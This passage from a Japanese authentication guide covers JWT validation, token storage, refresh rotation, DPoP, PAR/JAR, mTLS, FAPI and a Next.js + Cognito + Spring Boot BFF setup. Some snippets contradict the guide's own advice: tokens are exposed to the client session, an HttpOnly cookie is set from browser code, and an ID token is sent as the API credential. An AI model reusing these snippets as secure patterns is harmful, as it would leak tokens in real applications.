HttpServletResponse response,\n                                    FilterChain filterChain) throws ServletException, IOException {\n\n        String token = extractTokenFromRequest(request);\n\n        if (token != null &amp;&amp; jwtTokenProvider.validateToken(token)) {\n            Authentication auth = jwtTokenProvider.getAuthentication(token);\n            SecurityContextHolder.getContext().setAuthentication(auth);\n        }\n\n        filterChain.doFilter(request, response);\n    }\n\n    private String extractTokenFromRequest(HttpServletRequest request) {\n        String bearerToken = request.getHeader(\"Authorization\");\n        if (bearerToken != null &amp;&amp; bearerToken.startsWith(\"Bearer \")) {\n            return bearerToken.substring(7);\n        }\n        return null;\n    }\n}\n</code></pre>"},{"location":"authentication-guide/#_34","title":"\u6ce8\u610f\u30dd\u30a4\u30f3\u30c8","text":"<p>1. \u30c8\u30fc\u30af\u30f3\u4fdd\u5b58\u5834\u6240\u306e\u9078\u629e(2025\u5e74\u7248)</p> \u4fdd\u5b58\u5834\u6240 \u30e1\u30ea\u30c3\u30c8 \u30c7\u30e1\u30ea\u30c3\u30c8 \u63a8\u5968\u5ea6 HttpOnly Cookie XSS\u653b\u6483\u306b\u5f37\u3044 CSRF\u5bfe\u7b56\u5fc5\u8981 \u2705 \u9ad8 \u30e1\u30e2\u30ea(State\u7ba1\u7406) \u6700\u3082\u30bb\u30ad\u30e5\u30a2 \u30ea\u30ed\u30fc\u30c9\u3067\u6d88\u5931 \u2705 \u9ad8(\u77ed\u5bff\u547d\u30c8\u30fc\u30af\u30f3) SessionStorage \u30bf\u30d6\u6bce\u306b\u72ec\u7acb XSS\u8106\u5f31\u3001\u30bf\u30d6\u9589\u3058\u308b\u3068\u6d88\u5931 \u26a0\ufe0f \u4f4e LocalStorage \u5b9f\u88c5\u7c21\u5358\u3001\u5bb9\u91cf\u5927 XSS\u8106\u5f31\u3001\u6c38\u7d9a\u5316 \u274c \u4f7f\u7528\u7981\u6b62 <p>2025\u5e74\u306e\u63a8\u5968\u6226\u7565:</p> <ul> <li>BFF\u30d1\u30bf\u30fc\u30f3: \u30c8\u30fc\u30af\u30f3\u3092Next.js\u7b49\u306e\u30b5\u30fc\u30d0\u30fc\u5074\u3067\u7ba1\u7406(\u6700\u63a8\u5968)</li> <li>SPA\u76f4\u63a5: \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3\u306f\u30e1\u30e2\u30ea\u3001\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u306fHttpOnly Cookie</li> </ul> <p>2. \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3</p> <pre><code>// \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u306e\u4f7f\u3044\u6368\u3066\u6226\u7565\nconst refreshAccessToken = async (oldRefreshToken) =&gt; {\n  const response = await fetch('/auth/refresh', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ refreshToken: oldRefreshToken })\n  });\n\n  const { accessToken, refreshToken: newRefreshToken } = await response.json();\n\n  // \u65b0\u3057\u3044\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u3067\u53e4\u3044\u3082\u306e\u3092\u7f6e\u304d\u63db\u3048\n  httpOnlyCookie.set('refreshToken', newRefreshToken);\n\n  return accessToken;\n};\n\n// \u518d\u5229\u7528\u691c\u77e5(\u30b5\u30fc\u30d0\u30fc\u5074)\nif (isRefreshTokenReused(token)) {\n  // \u30c8\u30fc\u30af\u30f3\u30d5\u30a1\u30df\u30ea\u30fc\u5168\u4f53\u3092\u7121\u52b9\u5316(\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u4fb5\u5bb3\u306e\u53ef\u80fd\u6027)\n  revokeAllTokensForUser(userId);\n  return 401;\n}\n</code></pre> <p>3. CORS\u8a2d\u5b9a</p> <pre><code>// \u9069\u5207\u306aCORS\u8a2d\u5b9a\nconfiguration.setAllowedOrigins(Arrays.asList(\"https://your-frontend.com\"));\n// \u274c \u30ef\u30a4\u30eb\u30c9\u30ab\u30fc\u30c9(*)\u306fAllowCredentials=true\u3068\u4f75\u7528\u4e0d\u53ef\nconfiguration.setAllowCredentials(true);\n</code></pre> <p>3. \u30c8\u30fc\u30af\u30f3\u8a2d\u8a08(2025\u5e74\u7248)</p> <pre><code>\u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3:\n  \u6709\u52b9\u671f\u9650: 15\u5206\u301c1\u6642\u9593(\u77ed\u547d\u5316)\n  \u4fdd\u5b58\u5834\u6240: \u30e1\u30e2\u30ea\u307e\u305f\u306fBFF\u7ba1\u7406\n  \u7528\u9014: API\u8a8d\u8a3c\n  \u5f62\u5f0f: JWT(\u7f72\u540d\u3042\u308a)\u307e\u305f\u306fOpaque Token\n\n\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3:\n  \u6709\u52b9\u671f\u9650: 7\u301c30\u65e5\n  \u4fdd\u5b58\u5834\u6240: HttpOnly Cookie \u307e\u305f\u306f BFF\u7ba1\u7406\n  \u7528\u9014: \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3\u518d\u767a\u884c\n  \u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3: \u4f7f\u3044\u6368\u3066 + \u518d\u5229\u7528\u691c\u77e5\n\nID\u30c8\u30fc\u30af\u30f3(OIDC):\n  \u6709\u52b9\u671f\u9650: 1\u6642\u9593\n  \u7528\u9014: \u30e6\u30fc\u30b6\u30fc\u60c5\u5831\u53d6\u5f97\n  \u691c\u8a3c: issuer/audience/nonce\u5fc5\u9808\n</code></pre> <p>4. \u30c8\u30fc\u30af\u30f3\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u6226\u7565</p> <ul> <li>\u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3: \u77ed\u547d(15\u5206\u301c1\u6642\u9593)</li> <li>\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3: \u9577\u547d(7\u65e5\u301c30\u65e5)</li> <li>\u81ea\u52d5\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30ed\u30b8\u30c3\u30af\u306e\u5b9f\u88c5</li> </ul> <p>4. XSS\u5bfe\u7b56</p> <ul> <li>Content Security Policy(CSP)\u306e\u8a2d\u5b9a</li> <li>DOMPurify\u306a\u3069\u306e\u30b5\u30cb\u30bf\u30a4\u30ba\u30e9\u30a4\u30d6\u30e9\u30ea\u4f7f\u7528</li> <li>\u4fe1\u983c\u3067\u304d\u306a\u3044\u5165\u529b\u5024\u306e\u30a8\u30b9\u30b1\u30fc\u30d7</li> </ul> <p>5. \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30d8\u30c3\u30c0\u30fc</p> <pre><code>http.headers()\n    .xssProtection()\n    .contentSecurityPolicy(\"default-src 'self'\")\n    .and()\n    .frameOptions().deny()\n    .httpStrictTransportSecurity().maxAgeInSeconds(31536000);\n</code></pre>"},{"location":"authentication-guide/#_35","title":"\u6700\u65b0\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5f37\u5316\u6280\u8853","text":""},{"location":"authentication-guide/#1-par-pushed-authorization-requests","title":"1. PAR (Pushed Authorization Requests)","text":""},{"location":"authentication-guide/#_36","title":"\u6982\u8981","text":"<p>\u8a8d\u53ef\u30ea\u30af\u30a8\u30b9\u30c8\u30d1\u30e9\u30e1\u30fc\u30bf\u3092\u4e8b\u524d\u306b\u8a8d\u53ef\u30b5\u30fc\u30d0\u30fc\u3078\u30d7\u30c3\u30b7\u30e5\u3057\u3001\u6539\u3056\u3093\u3084\u6f0f\u3048\u3044\u3092\u9632\u3050\u6280\u8853\u3002</p>"},{"location":"authentication-guide/#_37","title":"\u52d5\u4f5c\u30d5\u30ed\u30fc","text":"<pre><code>sequenceDiagram\n    participant Client\n    participant AS as \u8a8d\u53ef\u30b5\u30fc\u30d0\u30fc\n\n    Client-&gt;&gt;AS: 1. POST /par (\u8a8d\u53ef\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u30d7\u30c3\u30b7\u30e5)\n    AS-&gt;&gt;Client: 2. request_uri\u8fd4\u5374\n    Client-&gt;&gt;AS: 3. \u8a8d\u53ef\u30ea\u30af\u30a8\u30b9\u30c8(request_uri\u4f7f\u7528)\n    AS-&gt;&gt;Client: 4. \u8a8d\u53ef\u30b3\u30fc\u30c9\u767a\u884c</code></pre>"},{"location":"authentication-guide/#_38","title":"\u30e1\u30ea\u30c3\u30c8","text":"<ul> <li>\u2705 URL\u30d1\u30e9\u30e1\u30fc\u30bf\u306e\u6539\u3056\u3093\u9632\u6b62</li> <li>\u2705 \u30d6\u30e9\u30a6\u30b6\u5c65\u6b74\u304b\u3089\u306e\u60c5\u5831\u6f0f\u3048\u3044\u9632\u6b62</li> <li>\u2705 \u30ea\u30af\u30a8\u30b9\u30c8\u30b5\u30a4\u30ba\u5236\u9650\u306e\u56de\u907f</li> </ul>"},{"location":"authentication-guide/#2-jarjarm-jwt-secured-authorization-requestresponse-mode","title":"2. JAR/JARM (JWT-Secured Authorization Request/Response Mode)","text":""},{"location":"authentication-guide/#jar-jwt-secured-authorization-request","title":"JAR (JWT-Secured Authorization Request)","text":"<p>\u8a8d\u53ef\u30ea\u30af\u30a8\u30b9\u30c8\u3092JWT\u5316\u3057\u3066\u7f72\u540d:</p> <pre><code>// \u8a8d\u53ef\u30ea\u30af\u30a8\u30b9\u30c8\u3092JWT\u5316\nconst request = jwt.sign({\n  response_type: 'code',\n  client_id: 'xxx',\n  redirect_uri: 'https://app.example.com/callback',\n  scope: 'openid profile',\n  state: 'xyz',\n  nonce: 'abc'\n}, privateKey, { algorithm: 'RS256' });\n\n// \u8a8d\u53ef\u30a8\u30f3\u30c9\u30dd\u30a4\u30f3\u30c8\u3078\nlocation.href = `${authServer}/authorize?request=${request}`;\n</code></pre>"},{"location":"authentication-guide/#jarm-jwt-secured-authorization-response-mode","title":"JARM (JWT-Secured Authorization Response Mode)","text":"<p>\u8a8d\u53ef\u30ec\u30b9\u30dd\u30f3\u30b9\u3092JWT\u5316\u3057\u3066\u6539\u3056\u3093\u691c\u77e5:</p> <ul> <li>\u30df\u30c3\u30af\u30b9\u30a2\u30c3\u30d7\u653b\u6483(\u7570\u306a\u308bAS\u304b\u3089\u306e\u30ec\u30b9\u30dd\u30f3\u30b9\u6df7\u5165)\u3092\u9632\u6b62</li> <li>\u30ec\u30b9\u30dd\u30f3\u30b9\u306e\u5b8c\u5168\u6027\u4fdd\u8a3c</li> </ul>"},{"location":"authentication-guide/#3-dpop-demonstrating-proof-of-possession","title":"3. DPoP (Demonstrating Proof-of-Possession)","text":""},{"location":"authentication-guide/#_39","title":"\u6982\u8981","text":"<p>\u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3\u3092\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u306e\u79d8\u5bc6\u9375\u306b\u30d0\u30a4\u30f3\u30c9\u3057\u3001\u30c8\u30fc\u30af\u30f3\u76d7\u96e3\u6642\u306e\u60aa\u7528\u3092\u9632\u3050\u3002</p>"},{"location":"authentication-guide/#_40","title":"\u4ed5\u7d44\u307f","text":"<pre><code>// 1. DPoP Proof\u3092\u751f\u6210(\u30ea\u30af\u30a8\u30b9\u30c8\u3054\u3068)\nconst dpopProof = jwt.sign({\n  jti: uuid(),\n  htm: 'GET',              // HTTP\u30e1\u30bd\u30c3\u30c9\n  htu: 'https://api.example.com/users',  // \u30ea\u30af\u30a8\u30b9\u30c8URI\n  iat: Date.now()\n}, clientPrivateKey, {\n  algorithm: 'ES256',\n  header: { typ: 'dpop+jwt', jwk: clientPublicKeyJWK }\n});\n\n// 2. API\u30ea\u30af\u30a8\u30b9\u30c8\nfetch('https://api.example.com/users', {\n  headers: {\n    'Authorization': `DPoP ${accessToken}`,\n    'DPoP': dpopProof\n  }\n});\n</code></pre>"},{"location":"authentication-guide/#_41","title":"\u30e1\u30ea\u30c3\u30c8","text":"<ul> <li>\u2705 \u30c8\u30fc\u30af\u30f3\u304c\u76d7\u307e\u308c\u3066\u3082\u79d8\u5bc6\u9375\u306a\u3057\u3067\u306f\u4f7f\u7528\u4e0d\u53ef</li> <li>\u2705 \u30c8\u30fc\u30af\u30f3\u30ea\u30d7\u30ec\u30a4\u653b\u6483\u306e\u9632\u6b62</li> <li>\u2705 \u4e2d\u9593\u8005\u653b\u6483\u3078\u306e\u8010\u6027\u5411\u4e0a</li> </ul>"},{"location":"authentication-guide/#4-mtls-mutual-tls","title":"4. mTLS (Mutual TLS)","text":""},{"location":"authentication-guide/#_42","title":"\u6982\u8981","text":"<p>\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u8a3c\u660e\u66f8\u3092\u4f7f\u3063\u305f\u76f8\u4e92TLS\u8a8d\u8a3c\u3002</p>"},{"location":"authentication-guide/#_43","title":"\u7528\u9014","text":"<ul> <li>M2M(Machine-to-Machine)\u901a\u4fe1</li> <li>\u9ad8\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u8981\u4ef6\u306e\u91d1\u878dAPI(FAPI\u6e96\u62e0)</li> <li>\u30c8\u30fc\u30af\u30f3\u306e\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u30d0\u30a4\u30f3\u30c7\u30a3\u30f3\u30b0</li> </ul> <pre><code>// Spring Boot \u3067\u306emTLS\u8a2d\u5b9a\n@Configuration\npublic class MtlsConfig {\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) {\n        http\n            .x509()\n                .subjectPrincipalRegex(\"CN=(.*?)(?:,|$)\")\n                .userDetailsService(userDetailsService());\n\n        return http.build();\n    }\n}\n</code></pre>"},{"location":"authentication-guide/#5-fapi-financial-grade-api","title":"5. FAPI (Financial-grade API)","text":""},{"location":"authentication-guide/#_44","title":"\u6982\u8981","text":"<p>\u91d1\u878d\u696d\u754c\u5411\u3051\u306e\u53b3\u683c\u306aOAuth/OIDC\u5b9f\u88c5\u30d7\u30ed\u30d5\u30a1\u30a4\u30eb\u3002</p>"},{"location":"authentication-guide/#_45","title":"\u8981\u4ef6","text":"<ul> <li>\u2705 PAR\u5fc5\u9808</li> <li>\u2705 JAR/JARM\u4f7f\u7528</li> <li>\u2705 DPoP \u307e\u305f\u306f mTLS \u306b\u3088\u308b\u30c8\u30fc\u30af\u30f3\u30d0\u30a4\u30f3\u30c7\u30a3\u30f3\u30b0</li> <li>\u2705 \u77ed\u5bff\u547d\u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3(\u63a8\u596810\u5206\u4ee5\u4e0b)</li> <li>\u2705 \u53b3\u683c\u306a\u30ea\u30c0\u30a4\u30ec\u30af\u30c8URI\u691c\u8a3c</li> <li>\u2705 state/nonce\u5fc5\u9808</li> </ul>"},{"location":"authentication-guide/#6-shared-signals-caep-continuous-access-evaluation-protocol","title":"6. Shared Signals / CAEP (Continuous Access Evaluation Protocol)","text":""},{"location":"authentication-guide/#_46","title":"\u6982\u8981","text":"<p>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30a4\u30d9\u30f3\u30c8\u3092\u30ea\u30a2\u30eb\u30bf\u30a4\u30e0\u3067\u5171\u6709\u3057\u3001\u7d99\u7d9a\u7684\u306a\u30a2\u30af\u30bb\u30b9\u8a55\u4fa1\u3092\u5b9f\u73fe\u3002</p>"},{"location":"authentication-guide/#_47","title":"\u30e6\u30fc\u30b9\u30b1\u30fc\u30b9","text":"<ul> <li>\u30e6\u30fc\u30b6\u30fc\u304c\u30d1\u30b9\u30ef\u30fc\u30c9\u5909\u66f4 \u2192 \u5168\u30bb\u30c3\u30b7\u30e7\u30f3\u7121\u52b9\u5316</li> <li>\u4e0d\u6b63\u30a2\u30af\u30bb\u30b9\u691c\u77e5 \u2192 \u8a72\u5f53\u30e6\u30fc\u30b6\u30fc\u306e\u5168\u30c8\u30fc\u30af\u30f3\u53d6\u308a\u6d88\u3057</li> <li>\u30c7\u30d0\u30a4\u30b9\u7d1b\u5931\u5831\u544a \u2192 \u8a72\u5f53\u30c7\u30d0\u30a4\u30b9\u304b\u3089\u306e\u30a2\u30af\u30bb\u30b9\u62d2\u5426</li> </ul> <pre><code>// \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30a4\u30d9\u30f3\u30c8\u306e\u53d7\u4fe1\napp.post('/security-events', (req, res) =&gt; {\n  const event = req.body;\n\n  if (event.type === 'session-revoked') {\n    revokeUserSessions(event.subject);\n  }\n\n  res.status(202).send();\n});\n</code></pre>"},{"location":"authentication-guide/#7-2025","title":"7. \u5178\u578b\u7684\u306a\u8105\u5a01\u3068\u5bfe\u7b56\u307e\u3068\u3081(2025\u5e74\u7248)","text":"\u8105\u5a01 \u5bfe\u7b56 \u30d5\u30a3\u30c3\u30b7\u30f3\u30b0 WebAuthn/\u30d1\u30b9\u30ad\u30fc\u3001\u30c9\u30e1\u30a4\u30f3\u30d0\u30a4\u30f3\u30c7\u30a3\u30f3\u30b0 MFA\u75b2\u52b4\u653b\u6483 \u30d7\u30c3\u30b7\u30e5\u901a\u77e5\u306b\u30c8\u30e9\u30f3\u30b6\u30af\u30b7\u30e7\u30f3\u8a73\u7d30\u8868\u793a\u3001\u6570\u5024\u30de\u30c3\u30c1\u30f3\u30b0 \u30c8\u30fc\u30af\u30f3\u7a83\u53d6 BFF\u3001DPoP/mTLS\u3001\u77ed\u5bff\u547d\u5316\u3001HttpOnly Cookie \u30c8\u30fc\u30af\u30f3\u30ea\u30d7\u30ec\u30a4 DPoP\u3001nonce\u3001jti(JWT ID) XSS CSP\u3001Trusted Types\u3001HttpOnly Cookie\u3001\u30c8\u30fc\u30af\u30f3\u306f\u30e1\u30e2\u30ea\u306e\u307f CSRF SameSite Cookie\u3001CSRF\u30c8\u30fc\u30af\u30f3\u3001Origin/Referer\u691c\u8a3c \u30bb\u30c3\u30b7\u30e7\u30f3\u56fa\u5b9a\u5316 \u30ed\u30b0\u30a4\u30f3\u6210\u529f\u6642\u306e\u30bb\u30c3\u30b7\u30e7\u30f3ID\u518d\u751f\u6210 \u30bb\u30c3\u30b7\u30e7\u30f3\u4e57\u3063\u53d6\u308a \u30c7\u30d0\u30a4\u30b9/IP\u7570\u5e38\u691c\u77e5\u3001\u30a2\u30af\u30c6\u30a3\u30d6\u30bb\u30c3\u30b7\u30e7\u30f3\u7ba1\u7406 \u30df\u30c3\u30af\u30b9\u30a2\u30c3\u30d7\u653b\u6483 issuer\u691c\u8a3c\u3001JARM\u3001state\u691c\u8a3c \u8a8d\u53ef\u30b3\u30fc\u30c9\u6a2a\u53d6\u308a PKCE\u5fc5\u9808\u5316 \u30aa\u30fc\u30d7\u30f3\u30ea\u30c0\u30a4\u30ec\u30af\u30bf \u30ea\u30c0\u30a4\u30ec\u30af\u30c8URI\u53b3\u683c\u4e00\u81f4\u3001\u30db\u30ef\u30a4\u30c8\u30ea\u30b9\u30c8"},{"location":"authentication-guide/#nextjs-spring-boot-aws-cognito","title":"Next.js + Spring Boot + AWS Cognito\u69cb\u6210\u306e\u30d9\u30b9\u30c8\u30d7\u30e9\u30af\u30c6\u30a3\u30b9","text":""},{"location":"authentication-guide/#2025-bff","title":"\u30b7\u30b9\u30c6\u30e0\u69cb\u6210\u56f3(2025\u5e74\u7248 - BFF\u30d1\u30bf\u30fc\u30f3)","text":"<pre><code>graph TB\n    Browser[\u30d6\u30e9\u30a6\u30b6]\n    NextJS[Next.js&lt;br/&gt;- \u30d5\u30ed\u30f3\u30c8\u30a8\u30f3\u30c9UI&lt;br/&gt;- BFF Backend for Frontend&lt;br/&gt;- \u30c8\u30fc\u30af\u30f3\u7ba1\u7406]\n    Cognito[AWS Cognito&lt;br/&gt;Identity Provider&lt;br/&gt;- \u8a8d\u8a3c\u30fbMFA&lt;br/&gt;- \u30c8\u30fc\u30af\u30f3\u767a\u884c&lt;br/&gt;- \u30d1\u30b9\u30ad\u30fc\u5bfe\u5fdc]\n    SpringBoot[Spring Boot API&lt;br/&gt;- \u30d3\u30b8\u30cd\u30b9\u30ed\u30b8\u30c3\u30af&lt;br/&gt;- \u30c7\u30fc\u30bf\u30a2\u30af\u30bb\u30b9&lt;br/&gt;- \u30c8\u30fc\u30af\u30f3\u691c\u8a3c]\n    DB[\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9]\n\n    Browser --&gt;|\u2460 Cookie(HttpOnly/Secure)| NextJS\n    NextJS --&gt;|\u2461 Authorization Code + PKCE| Cognito\n    Cognito --&gt;|ID\u30c8\u30fc\u30af\u30f3/\u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3| NextJS\n    NextJS --&gt;|\u2462 Bearer Token| SpringBoot\n    SpringBoot --&gt; DB\n\n    style NextJS fill:#e1f5ff\n    style Cognito fill:#fff3e0</code></pre> <p>\u91cd\u8981: \u3053\u306e\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\u306f2025\u5e74\u306e\u30d9\u30b9\u30c8\u30d7\u30e9\u30af\u30c6\u30a3\u30b9(BFF\u3001PKCE\u3001\u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie\u975e\u4f9d\u5b58)\u306b\u6e96\u62e0\u3057\u3066\u3044\u307e\u3059\u3002</p>"},{"location":"authentication-guide/#_48","title":"\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\u306e\u7279\u5fb4","text":""},{"location":"authentication-guide/#_49","title":"\u5404\u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8\u306e\u5f79\u5272","text":"<p>1. Next.js (\u30d5\u30ed\u30f3\u30c8\u30a8\u30f3\u30c9 + BFF)</p> <ul> <li>\u30e6\u30fc\u30b6\u30fc\u30a4\u30f3\u30bf\u30fc\u30d5\u30a7\u30fc\u30b9(React/SSR)</li> <li>\u8a8d\u8a3c\u30d5\u30ed\u30fc\u306e\u958b\u59cb\u30fb\u7ba1\u7406(Authorization Code + PKCE)</li> <li>Spring Boot API\u3078\u306e\u30d7\u30ed\u30ad\u30b7(BFF\u30d1\u30bf\u30fc\u30f3)</li> <li>\u30c8\u30fc\u30af\u30f3\u306e\u5b89\u5168\u306a\u7ba1\u7406(\u30b5\u30fc\u30d0\u30fc\u5074\u30bb\u30c3\u30b7\u30e7\u30f3)</li> <li>\u30d6\u30e9\u30a6\u30b6\u3068\u306e\u901a\u4fe1\u306fHttpOnly Cookie(XSS\u5bfe\u7b56)</li> </ul> <p>2. AWS Cognito (IdP)</p> <ul> <li>\u30e6\u30fc\u30b6\u30fc\u767b\u9332\u30fb\u8a8d\u8a3c(\u30e1\u30fc\u30eb/\u30d1\u30b9\u30ef\u30fc\u30c9\u3001\u30bd\u30fc\u30b7\u30e3\u30eb)</li> <li>ID\u30c8\u30fc\u30af\u30f3\u3001\u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3\u3001\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u306e\u767a\u884c</li> <li>MFA(\u591a\u8981\u7d20\u8a8d\u8a3c)\u63d0\u4f9b: TOTP\u3001SMS\u3001WebAuthn/\u30d1\u30b9\u30ad\u30fc</li> <li>\u30bd\u30fc\u30b7\u30e3\u30eb\u30ed\u30b0\u30a4\u30f3\u7d71\u5408(Google, Facebook\u7b49)</li> <li>\u30a2\u30c0\u30d7\u30c6\u30a3\u30d6\u8a8d\u8a3c(\u7570\u5e38\u691c\u77e5\u3001\u30ea\u30b9\u30af\u30d9\u30fc\u30b9)</li> </ul> <p>3. Spring Boot (API\u30b5\u30fc\u30d0\u30fc)</p> <ul> <li>\u30d3\u30b8\u30cd\u30b9\u30ed\u30b8\u30c3\u30af\u5b9f\u884c</li> <li>\u30c7\u30fc\u30bf\u64cd\u4f5c(CRUD)</li> <li>Cognito\u30c8\u30fc\u30af\u30f3\u306e\u691c\u8a3c(JWT\u7f72\u540d\u691c\u8a3c\u3001issuer/audience\u78ba\u8a8d)</li> <li>\u8a8d\u53ef\u5236\u5fa1(\u30ed\u30fc\u30eb\u30d9\u30fc\u30b9\u30a2\u30af\u30bb\u30b9\u5236\u5fa1)</li> <li>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30d8\u30c3\u30c0\u30fc\u8a2d\u5b9a</li> </ul>"},{"location":"authentication-guide/#2025_3","title":"\u30d9\u30b9\u30c8\u30d7\u30e9\u30af\u30c6\u30a3\u30b9(2025\u5e74\u7248)","text":""},{"location":"authentication-guide/#1_5","title":"1. \u8a8d\u8a3c\u30d5\u30ed\u30fc\u306e\u5b9f\u88c5","text":"<p>\u5fc5\u9808: Authorization Code Flow with PKCE</p> <p>\u274c Implicit Flow\u306f\u4f7f\u7528\u7981\u6b62(OAuth 2.1\u3067\u5ec3\u6b62)</p> <p>\u2705 PKCE(Proof Key for Code Exchange)\u306e\u5229\u70b9:</p> <ul> <li>\u8a8d\u53ef\u30b3\u30fc\u30c9\u6a2a\u53d6\u308a\u653b\u6483\u3092\u9632\u6b62</li> <li>\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u30b7\u30fc\u30af\u30ec\u30c3\u30c8\u4e0d\u8981(SPA\u3067\u3082\u5b89\u5168)</li> <li>\u3059\u3079\u3066\u306eOAuth 2.1\u5b9f\u88c5\u3067\u5fc5\u9808\u5316</li> </ul> <p>\u5b9f\u88c5\u624b\u9806</p> <p>Step 1: Next.js\u3067\u306e\u8a8d\u8a3c\u8a2d\u5b9a(NextAuth\u4f7f\u7528)</p> <pre><code>// pages/api/auth/[...nextauth].js\nimport NextAuth from 'next-auth';\nimport CognitoProvider from 'next-auth/providers/cognito';\n\nexport default NextAuth({\n  providers: [\n    CognitoProvider({\n      clientId: process.env.COGNITO_CLIENT_ID,\n      clientSecret: process.env.COGNITO_CLIENT_SECRET,\n      issuer: process.env.COGNITO_ISSUER, // https://cognito-idp.{region}.amazonaws.com/{userPoolId}\n      checks: ['pkce', 'state'], // PKCE\u3068CSRF\u5bfe\u7b56\n    })\n  ],\n  session: {\n    strategy: 'jwt',\n    maxAge: 30 * 24 * 60 * 60, // 30 days\n  },\n  callbacks: {\n    async jwt({ token, account, profile }) {\n      // Cognito\u304b\u3089\u306e\u30c8\u30fc\u30af\u30f3\u3092\u30bb\u30c3\u30b7\u30e7\u30f3\u306b\u4fdd\u5b58\n      if (account) {\n        token.accessToken = account.access_token;\n        token.idToken = account.id_token;\n        token.refreshToken = account.refresh_token;\n        token.sub = profile.sub;\n      }\n      return token;\n    },\n    async session({ session, token }) {\n      // \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u5074\u3067\u4f7f\u7528\u3059\u308b\u30bb\u30c3\u30b7\u30e7\u30f3\u60c5\u5831\n      session.accessToken = token.accessToken;\n      session.idToken = token.idToken;\n      session.user.id = token.sub;\n      return session;\n    }\n  },\n  pages: {\n    signIn: '/auth/signin',\n    error: '/auth/error',\n  }\n});\n</code></pre> <p>Step 2: API\u547c\u3073\u51fa\u3057\u6642\u306e\u30c8\u30fc\u30af\u30f3\u4ed8\u4e0e</p> <pre><code>// lib/apiClient.js\nimport { getSession } from 'next-auth/react';\nimport axios from 'axios';\n\nexport const apiClient = axios.create({\n  baseURL: process.env.NEXT_PUBLIC_API_URL,\n});\n\n// BFF\u30d1\u30bf\u30fc\u30f3: Next.js API Route\u3092\u7d4c\u7531\n// pages/api/proxy/[...path].js\nimport { getServerSession } from \"next-auth/next\";\nimport { authOptions } from \"../auth/[...nextauth]\";\n\nexport default async function handler(req, res) {\n  const session = await getServerSession(req, res, authOptions);\n\n  if (!session) {\n    return res.status(401).json({ error: 'Unauthorized' });\n  }\n\n  // Spring Boot\u3078\u30d7\u30ed\u30ad\u30b7\u30ea\u30af\u30a8\u30b9\u30c8\n  const apiUrl = `${process.env.API_BASE_URL}${req.query.path.join('/')}`;\n\n  try {\n    const response = await fetch(apiUrl, {\n      method: req.method,\n      headers: {\n        'Content-Type': 'application/json',\n        'Authorization': `Bearer ${session.idToken}`, // ID\u30c8\u30fc\u30af\u30f3\u3092\u9001\u4fe1\n      },\n      body: req.method !== 'GET' ? JSON.stringify(req.body) : undefined,\n    });\n\n    const data = await response.json();\n    res.status(response.status).json(data);\n  } catch (error) {\n    res.status(500).json({ error: 'API request failed' });\n  }\n}\n\n// \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u5074\u306e\u4f7f\u7528\u4f8b\n// components/UserProfile.jsx\nimport { useSession } from 'next-auth/react';\nimport { useEffect, useState } from 'react';\n\nexport default function UserProfile() {\n  const { data: session } = useSession();\n  const [profile, setProfile] = useState(null);\n\n  useEffect(() =&gt; {\n    if (session) {\n      // BFF\u7d4c\u7531\u3067API\u306b\u30a2\u30af\u30bb\u30b9\n      fetch('/api/proxy/users/profile')\n        .then(res =&gt; res.json())\n        .then(data =&gt; setProfile(data));\n    }\n  }, [session]);\n\n  if (!session) return &lt;div&gt;Please sign in&lt;/div&gt;;\n\n  return (\n    &lt;div&gt;\n      &lt;h1&gt;Welcome {session.user.name}&lt;/h1&gt;\n      {profile &amp;&amp; &lt;pre&gt;{JSON.stringify(profile, null, 2)}&lt;/pre&gt;}\n    &lt;/div&gt;\n  );\n}\n</code></pre> <p>Step 3: Spring Boot\u3067\u306eCognito\u30c8\u30fc\u30af\u30f3\u691c\u8a3c</p> <pre><code>// build.gradle\ndependencies {\n    implementation 'org.springframework.boot:spring-boot-starter-security'\n    implementation 'org.springframework.boot:spring-boot-starter-oauth2-resource-server'\n}\n\n// application.yml\nspring:\n  security:\n    oauth2:\n      